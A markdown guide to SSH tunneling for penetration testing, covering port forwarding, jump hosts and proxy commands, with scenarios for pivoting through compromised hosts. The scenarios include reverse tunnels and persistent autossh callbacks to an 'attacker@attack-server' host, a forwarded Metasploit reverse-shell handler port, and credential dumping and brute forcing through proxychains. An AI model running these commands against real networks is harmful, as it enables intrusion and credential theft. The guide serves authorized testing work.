# SSH Tunneling and Port Forwarding

Comprehensive guide to SSH tunneling techniques for penetration testing, including local/remote/dynamic port forwarding, jump hosts, and proxy configurations.

## Table of Contents

- [Overview](#overview)
- [Local Port Forwarding (-L)](#local-port-forwarding--l)
- [Remote Port Forwarding (-R)](#remote-port-forwarding--r)
- [Dynamic Port Forwarding / SOCKS Proxy (-D)](#dynamic-port-forwarding--socks-proxy--d)
- [ProxyJump / Jump Hosts (-J)](#proxyjump--jump-hosts--j)
- [SSH over HTTP Proxy (ProxyCommand)](#ssh-over-http-proxy-proxycommand)
- [Pentesting Scenarios](#pentesting-scenarios)
  - [Pivoting to Internal Networks](#pivoting-to-internal-networks)
  - [Accessing Internal Web Services](#accessing-internal-web-services)
  - [Chaining Multiple SSH Hops](#chaining-multiple-ssh-hops)
  - [Using with Proxychains](#using-with-proxychains)
  - [Reverse SSH Tunnels for Callbacks](#reverse-ssh-tunnels-for-callbacks)
- [SSH Config Examples](#ssh-config-examples)
- [Troubleshooting](#troubleshooting)

## Overview

SSH tunneling creates encrypted channels that forward network traffic through an SSH connection. This is essential for:

- Bypassing firewalls and network segmentation
- Accessing internal services from external networks
- Pivoting through compromised hosts
- Encrypting traffic for otherwise unencrypted protocols
- Establishing reverse connections from restricted networks

### Key Options for Tunneling

| Option | Description |
|--------|-------------|
| `-L` | Local port forwarding (forward local port to remote destination) |
| `-R` | Remote port forwarding (forward remote port to local destination) |
| `-D` | Dynamic SOCKS proxy |
| `-J` | Jump host (ProxyJump) |
| `-N` | No remote command (just forward ports) |
| `-f` | Background the SSH process |
| `-g` | Allow remote hosts to connect to forwarded ports |
| `-o` | Set options (e.g., ProxyCommand) |

## Local Port Forwarding (-L)

Local port forwarding binds a port on the local machine and forwards connections to a destination through the SSH server.

### Syntax

```
-L [bind_address:]local_port:destination_host:destination_port
```

### Basic Examples

```bash
# Forward local port 8080 to remote host's port 80
ssh -L 8080:localhost:80 user@ssh-server

# Access localhost:8080 to reach ssh-server:80

# Forward to a third host through the SSH server
ssh -L 8080:internal-web.corp:80 user@ssh-server

# Access localhost:8080 to reach internal-web.corp:80 (from ssh-server's perspective)

# Forward multiple ports
ssh -L 8080:web.internal:80 -L 3306:db.internal:3306 user@ssh-server

# Bind to all interfaces (allow other machines to use the tunnel)
ssh -L 0.0.0.0:8080:internal:80 user@ssh-server

# Background the tunnel with no shell
ssh -fN -L 8080:localhost:80 user@ssh-server
```

### Diagram

```
Local Machine          SSH Server           Target
+-------------+       +-----------+       +--------+
| localhost   |------>|           |------>|        |
| :8080       | SSH   | ssh-server| TCP   | :80    |
+-------------+       +-----------+       +--------+

You connect to localhost:8080
Traffic goes through SSH tunnel
Arrives at target:80
```

## Remote Port Forwarding (-R)

Remote port forwarding binds a port on the SSH server and forwards connections back to your local machine (or another host accessible from your machine).

### Syntax

```
-R [bind_address:]remote_port:destination_host:destination_port
```

### Basic Examples

```bash
# Forward remote port 8080 to local port 80
ssh -R 8080:localhost:80 user@ssh-server

# Anyone connecting to ssh-server:8080 reaches your localhost:80

# Forward remote port to a different local service
ssh -R 9000:localhost:3000 user@ssh-server

# Expose local service to remote network
ssh -R 0.0.0.0:8080:localhost:80 user@ssh-server
# Note: Requires GatewayPorts yes in sshd_config

# Background the reverse tunnel
ssh -fN -R 8080:localhost:80 user@ssh-server

# Dynamic remote port (server assigns port)
ssh -R 0:localhost:22 user@ssh-server
# Server will report: Allocated port XXXXX for remote forward
```

### Diagram

```
Local Machine          SSH Server           Remote Client
+-------------+       +-----------+       +-------------+
|             |<------|           |<------|             |
| localhost:80| SSH   | :8080     | TCP   | Client      |
+-------------+       +-----------+       +-------------+

Remote client connects to ssh-server:8080
Traffic goes through SSH tunnel
Arrives at your localhost:80
```

### Server Configuration for Remote Forwarding

To allow binding to all interfaces (not just localhost), the SSH server needs:

```
# /etc/ssh/sshd_config
GatewayPorts yes
# or
GatewayPorts clientspecified
```

## Dynamic Port Forwarding / SOCKS Proxy (-D)

Dynamic forwarding creates a SOCKS proxy server on the local machine. Applications can use this proxy to route traffic through the SSH server.

### Syntax

```
-D [bind_address:]port
```

### Basic Examples

```bash
# Create SOCKS proxy on port 1080
ssh -D 1080 user@ssh-server

# Bind to all interfaces
ssh -D 0.0.0.0:1080 user@ssh-server

# Background the SOCKS proxy
ssh -fN -D 1080 user@ssh-server

# With compression for slow links
ssh -C -D 1080 user@ssh-server
```

### Using the SOCKS Proxy

```bash
# curl with SOCKS5 proxy
curl --socks5 127.0.0.1:1080 http://internal-site.corp

# curl with SOCKS5 and DNS resolution through proxy
curl --socks5-hostname 127.0.0.1:1080 http://internal-site.corp

# wget with SOCKS proxy (via proxychains)
proxychains wget http://internal-site.corp

# Firefox: Set network.proxy.socks to 127.0.0.1:1080
# Chrome: --proxy-server="socks5://127.0.0.1:1080"

# nmap through SOCKS proxy
nmap -sT -Pn --proxy socks4://127.0.0.1:1080 192.168.1.0/24
```

### Diagram

```
Local Machine              SSH Server           Any Destination
+----------------+        +-----------+        +--------------+
| Application    |        |           |        |              |
|      |         |        |           |        |  web.corp    |
|      v         |        |           |        |  db.corp     |
| SOCKS :1080    |------->|           |------->|  any.corp    |
+----------------+  SSH   +-----------+  TCP   +--------------+

Applications connect to SOCKS proxy
Proxy forwards through SSH tunnel
Can reach any destination the SSH server can access
```

## ProxyJump / Jump Hosts (-J)

ProxyJump provides a clean way to hop through intermediate hosts to reach a final destination.

### Syntax

```
-J [user@]jump_host[:port]
```

### Basic Examples

```bash
# Single jump host
ssh -J jump@bastion.example.com user@internal.target

# Multiple jump hosts (comma-separated)
ssh -J user1@jump1,user2@jump2 user@final-target

# Jump host on non-standard port
ssh -J user@bastion:2222 user@internal.target

# With identity files
ssh -J user@bastion -i ~/.ssh/internal_key user@internal.target
```

### Equivalent ProxyCommand

```bash
# These are equivalent:
ssh -J bastion user@target

ssh -o ProxyCommand="ssh -W %h:%p bastion" user@target
```

### SSH Config for Jump Hosts

```
# ~/.ssh/config

Host bastion
    HostName bastion.example.com
    User jumpuser
    IdentityFile ~/.ssh/bastion_key

Host internal-*
    ProxyJump bastion
    User admin

Host internal-web
    HostName 10.0.1.10

Host internal-db
    HostName 10.0.1.20
```

Then use:
```bash
ssh internal-web
ssh internal-db
```

## SSH over HTTP Proxy (ProxyCommand)

When direct SSH connections are blocked, you can tunnel SSH through HTTP proxies using ProxyCommand.

### Using netcat (nc)

```bash
# Through HTTP CONNECT proxy
ssh -o ProxyCommand="nc -X connect -x proxy.corp:8080 %h %p" user@target

# Through SOCKS proxy
ssh -o ProxyCommand="nc -X 5 -x socks-proxy:1080 %h %p" user@target
```

### Using ncat (nmap's netcat)

```bash
# HTTP CONNECT proxy
ssh -o ProxyCommand="ncat --proxy proxy.corp:8080 --proxy-type http %h %p" user@target

# With proxy authentication
ssh -o ProxyCommand="ncat --proxy proxy.corp:8080 --proxy-type http --proxy-auth user:pass %h %p" user@target

# SOCKS5 proxy
ssh -o ProxyCommand="ncat --proxy proxy:1080 --proxy-type socks5 %h %p" user@target
```

### Using connect-proxy

```bash
# Install: apt install connect-proxy

# HTTP proxy
ssh -o ProxyCommand="connect-proxy -H proxy.corp:8080 %h %p" user@target

# SOCKS proxy
ssh -o ProxyCommand="connect-proxy -S socks-proxy:1080 %h %p" user@target
```

### Using corkscrew

```bash
# Install: apt install corkscrew

# Through HTTP proxy
ssh -o ProxyCommand="corkscrew proxy.corp 8080 %h %p" user@target

# With authentication file
echo "username:password" > ~/.corkscrew-auth
ssh -o ProxyCommand="corkscrew proxy.corp 8080 %h %p ~/.corkscrew-auth" user@target
```

### SSH Config for Proxy

```
# ~/.ssh/config

Host target-behind-proxy
    HostName target.example.com
    User admin
    ProxyCommand nc -X connect -x corporate-proxy:8080 %h %p
```

## Pentesting Scenarios

### Pivoting to Internal Networks

After compromising a host with SSH access, use it to pivot into the internal network.

#### Scenario: Compromised DMZ Host

```
Internet --> [Firewall] --> DMZ (10.0.0.0/24) --> [Firewall] --> Internal (192.168.0.0/24)
                            ^                                    ^
                            Compromised: 10.0.0.50               Target: 192.168.0.100
```

**Step 1: Establish SOCKS proxy through compromised host**
```bash
# From attack machine
ssh -D 1080 -fN user@10.0.0.50
```

**Step 2: Scan internal network through proxy**
```bash
# Configure proxychains (/etc/proxychains.conf)
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 192.168.0.0/24

# Or use nmap's built-in proxy support
nmap -sT -Pn --proxy socks4://127.0.0.1:1080 192.168.0.100
```

**Step 3: Access internal services**
```bash
# RDP to internal Windows host
proxychains xfreerdp /v:192.168.0.100 /u:admin

# Access internal web application
curl --socks5-hostname 127.0.0.1:1080 http://192.168.0.100/admin

# SMB enumeration
proxychains smbclient -L //192.168.0.100/ -U admin
```

### Accessing Internal Web Services

Forward ports to access internal web applications directly in your browser.

#### Scenario: Multiple Internal Web Apps

```bash
# Forward multiple internal web services
ssh -L 8001:intranet.corp:80 \
    -L 8002:jenkins.corp:8080 \
    -L 8003:gitlab.corp:443 \
    -L 8004:splunk.corp:8000 \
    -fN user@compromised-host
```

Access in browser:
- `http://localhost:8001` - Intranet
- `http://localhost:8002` - Jenkins
- `https://localhost:8003` - GitLab
- `http://localhost:8004` - Splunk

#### Scenario: Database Access

```bash
# Forward MySQL
ssh -L 3306:db.internal:3306 -fN user@jump-host

# Connect with mysql client
mysql -h 127.0.0.1 -u dbuser -p

# Forward PostgreSQL
ssh -L 5432:postgres.internal:5432 -fN user@jump-host

# Connect with psql
psql -h localhost -U dbuser -d database

# Forward MSSQL
ssh -L 1433:mssql.internal:1433 -fN user@jump-host

# Connect with mssqlclient.py (impacket)
mssqlclient.py user:pass@127.0.0.1
```

### Chaining Multiple SSH Hops

When targets are multiple hops away, chain SSH connections.

#### Scenario: Multi-Tier Network

```
Attack Box --> DMZ Host --> App Server --> Database Server
               10.0.0.5     192.168.1.10   172.16.0.20
```

**Method 1: ProxyJump (recommended)**
```bash
# Direct connection through two jump hosts
ssh -J user1@10.0.0.5,user2@192.168.1.10 dbadmin@172.16.0.20

# Forward database port through chain
ssh -J user1@10.0.0.5,user2@192.168.1.10 -L 3306:localhost:3306 -fN dbadmin@172.16.0.20
```

**Method 2: Nested SSH Commands**
```bash
# Create tunnel to first hop
ssh -L 2201:192.168.1.10:22 -fN user1@10.0.0.5

# Create tunnel to second hop through first
ssh -p 2201 -L 2202:172.16.0.20:22 -fN user2@localhost

# Connect to final target
ssh -p 2202 dbadmin@localhost
```

**Method 3: SSH Config**
```
# ~/.ssh/config

Host dmz
    HostName 10.0.0.5
    User user1

Host app-server
    HostName 192.168.1.10
    User user2
    ProxyJump dmz

Host db-server
    HostName 172.16.0.20
    User dbadmin
    ProxyJump app-server
```

Then simply:
```bash
ssh db-server
```

### Using with Proxychains

Proxychains forces applications to use a SOCKS/HTTP proxy. Combined with SSH dynamic forwarding, it enables pivoting with any tool.

#### Setup

```bash
# Create SOCKS proxy
ssh -D 9050 -fN user@pivot-host
```

#### Configure proxychains

```bash
# /etc/proxychains4.conf (or /etc/proxychains.conf)

# Use strict chain (try each proxy in order)
strict_chain

# Quiet mode (less output)
quiet_mode

# Proxy DNS through proxy
proxy_dns

[ProxyList]
socks5 127.0.0.1 9050
```

#### Use with Common Tools

```bash
# Nmap (TCP connect scan only, no ping)
proxychains nmap -sT -Pn -n 192.168.1.0/24

# Metasploit
proxychains msfconsole
# Or set PROXIES in module options

# Hydra
proxychains hydra -l admin -P wordlist.txt 192.168.1.100 ssh

# Gobuster
proxychains gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# CrackMapExec
proxychains crackmapexec smb 192.168.1.0/24

# Impacket tools
proxychains secretsdump.py domain/user:pass@192.168.1.100

# curl
proxychains curl http://internal-app:8080/api/users

# sqlmap
proxychains sqlmap -u "http://192.168.1.100/page?id=1"
```

#### Multiple Proxy Chains

```
# /etc/proxychains4.conf

# Chain multiple proxies
strict_chain

[ProxyList]
# First pivot
socks5 127.0.0.1 9050
# Second pivot (if using nested SOCKS)
socks5 127.0.0.1 9051
```

### Reverse SSH Tunnels for Callbacks

When the target network has strict egress filtering, use reverse tunnels to establish connectivity back to your attack infrastructure.

#### Scenario: Restricted Outbound Access

Target can only reach your attack server on specific ports (e.g., 443).

**On Attack Server (setup listener)**
```bash
# Ensure SSH is running on attack server
# Optional: Create dedicated user with restricted shell

# Allow reverse port forwarding
# /etc/ssh/sshd_config
GatewayPorts clientspecified
AllowTcpForwarding yes
```

**From Compromised Host (initiate reverse tunnel)**
```bash
# Basic reverse tunnel - expose target's SSH to attacker
ssh -R 2222:localhost:22 attacker@attack-server -p 443

# Attacker can now: ssh -p 2222 user@attack-server

# Expose internal network through SOCKS
ssh -R 1080 attacker@attack-server -p 443
# Creates SOCKS proxy on attack-server:1080

# Persistent reverse tunnel with autossh
autossh -M 0 -f -N -R 2222:localhost:22 attacker@attack-server -p 443 \
    -o "ServerAliveInterval 30" \
    -o "ServerAliveCountMax 3"
```

**From Attack Server (use the tunnel)**
```bash
# Connect to target's SSH through reverse tunnel
ssh -p 2222 target-user@localhost

# If SOCKS proxy was set up, configure tools to use attack-server:1080
curl --socks5 attack-server:1080 http://internal-target/
```

#### Reverse Tunnel for Reverse Shell Handler

```bash
# On compromised host: forward attacker's Metasploit handler port
ssh -R 4444:localhost:4444 attacker@attack-server -fN

# Now reverse shells to compromised-host:4444
# will reach attacker's handler via the tunnel
```

#### SSH Reverse Tunnel Without Shell Access

If you have SSH credentials but want to avoid interactive shells:

```bash
# Connect with tunnel only, no shell
ssh -N -R 2222:localhost:22 user@attack-server

# Combined with other tunnels
ssh -N \
    -R 2222:localhost:22 \
    -R 8080:internal-web:80 \
    -R 3389:internal-windows:3389 \
    user@attack-server
```

## SSH Config Examples

### Pentesting SSH Config Template

```
# ~/.ssh/config

# Global settings
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR

# Jump/Bastion host
Host bastion
    HostName 10.10.10.10
    User pentester
    IdentityFile ~/.ssh/pentest_key
    DynamicForward 9050

# Target through bastion
Host target
    HostName 192.168.1.100
    User admin
    ProxyJump bastion
    LocalForward 8080 localhost:80
    LocalForward 3306 localhost:3306

# Multiple jump chain
Host deep-target
    HostName 172.16.0.50
    User root
    ProxyJump bastion,target

# HTTP proxy connection
Host proxy-target
    HostName external-target.com
    User user
    ProxyCommand nc -X connect -x corporate-proxy:8080 %h %p
```

### Persistent Tunnel with Autossh

```bash
# Install autossh
apt install autossh

# Create persistent SOCKS proxy
autossh -M 0 -f -N -D 1080 user@pivot-host \
    -o "ServerAliveInterval 30" \
    -o "ServerAliveCountMax 3" \
    -o "ExitOnForwardFailure yes"

# Create persistent local forward
autossh -M 0 -f -N -L 8080:internal:80 user@pivot-host \
    -o "ServerAliveInterval 30" \
    -o "ServerAliveCountMax 3"
```

## Troubleshooting

### Common Issues

**Port already in use**
```bash
# Find process using port
lsof -i :8080
netstat -tlnp | grep 8080

# Kill existing tunnel
pkill -f "ssh.*-L.*8080"
```

**Connection refused on forwarded port**
```bash
# Verify tunnel is established
ssh user@host -O check

# Check with verbose output
ssh -v -L 8080:target:80 user@host

# Ensure target service is running
ssh user@host "netstat -tlnp | grep 80"
```

**Remote forwarding not accessible from other hosts**
```bash
# Check GatewayPorts setting on server
grep GatewayPorts /etc/ssh/sshd_config

# Use explicit bind address
ssh -R 0.0.0.0:8080:localhost:80 user@server
```

**DNS not resolving through SOCKS**
```bash
# Use --socks5-hostname for curl
curl --socks5-hostname 127.0.0.1:1080 http://internal-name/

# Enable proxy_dns in proxychains
# /etc/proxychains.conf
proxy_dns
```

**Tunnel drops frequently**
```bash
# Add keepalive settings
ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ...

# Use autossh for automatic reconnection
autossh -M 0 -f -N ...
```

### Debugging Tunnels

```bash
# Maximum verbosity
ssh -vvv -L 8080:target:80 user@host

# List active forwardings (while connected)
# Press Enter, then ~#

# Check local listening ports
ss -tlnp | grep ssh
netstat -tlnp | grep ssh

# Test tunnel connectivity
nc -zv localhost 8080
curl -v http://localhost:8080
```

## See Also

- [README.md](README.md) - SSH overview and basic usage
- [options.md](options.md) - Complete command-line options reference
- [ProxyChains Documentation](https://github.com/haad/proxychains)
- [Autossh](https://www.harding.motd.ca/autossh/)
